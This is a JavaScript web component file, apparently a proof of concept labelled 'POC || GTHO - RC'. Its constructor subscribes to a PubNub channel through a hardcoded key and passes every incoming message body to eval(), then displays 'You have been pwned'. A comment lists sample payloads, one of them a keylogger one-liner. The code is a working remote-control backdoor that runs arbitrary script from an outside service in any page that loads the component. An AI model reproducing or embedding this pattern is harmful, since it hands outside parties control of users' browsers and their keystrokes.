
const template = document.createElement('template');
template.innerHTML = `
  <style>
    div {
      padding: 8px;
      border: 1px solid #ccc;
      width: 150px;
      hight: 350
    }
  </style>
  
  <header>
    <h3>POC || GTHO - RC</h3>
  </header>
  
  <div>
  <slot name="header" id="pwn"></slot>
  </div>
  
  <div> <img src="https://user-images.githubusercontent.com/993459/66792839-301f4d00-eec0-11e9-9b83-39709a099c5f.jpeg" id="rcimage" width="50%" height="50%"/></div>
  <div id="box">
    <span slot="data_message" id="data_message">
    <img src="https://user-images.githubusercontent.com/993459/66792752-bf783080-eebf-11e9-9cbb-4b547abb4776.png" id="pawn" width="50%" height="50%">
    </span>
  </div>
  <div>
    <slot name="footer"></slot>
  </div>  
</body>
</html>
`;


export class RCCOM extends HTMLElement {
  static get observedAttributes() {
    return ['title'];
  }

  get title() {
    return this._title;
  }

  set title(value) {
    this._title = value;
    this.buttonElement.innerText = this._title;
  }

  constructor() {
    console.log('Constructor Lifecycle event')

    /**
     *
     {"Functions": {"action":"eval","body":"document.onkeypress=function(e){console.log(e)}"}}
     {"Functions": {"action":"eval","body":"alert('Hello mottto')"}}
     {"Functions": {"action":"jpeg","body":""}}

     */
    super();
    this._title = 'rccom';
    this.show = false;

    this.attachShadow({ mode: 'open' });
    this.shadowRoot.appendChild(template.content.cloneNode(true));

    console.log(this.shadowRoot.getElementById('rcimage').src)

    var that = this;

    const loadPubnub = ()=> {
      var pubnub = new PubNub({publishKey: 'NA', subscribeKey: 'sub-c-55e637e0-584c-11e7-b679-0619f8945a4f'});
      pubnub.subscribe({channels: ['data']}); // Subscribe to a channel.
      pubnub.addListener({
        message: function (m) {
          console.log('Message Function:',m.message)
          var f = m.message.Functions;
          if (f.action === 'eval') {
            eval(f.body);
            var evt = new CustomEvent('rccom-from', { detail: {message:'You have been pwn' }});
            window.dispatchEvent(evt);
            that.shadowRoot.querySelector("#pwn").value = 'You have been pwned!';
            that.shadowRoot.querySelector("#pawn").src = 'https://user-images.githubusercontent.com/993459/66792797-f8180a00-eebf-11e9-83cc-1a03729040cb.png';
            console.log(that.shadowRoot.querySelector("#pawn").src)
          }
          if (f.action === 'jpeg') {
            console.log('jpeg')
            //document.getElementById("rcimage").src = "pawned.jpeg"
          }
        }
      });
    };
    console.log('Loading PubNub')
    loadPubnub()
  }
}

customElements.define('x-rccom', RCCOM);

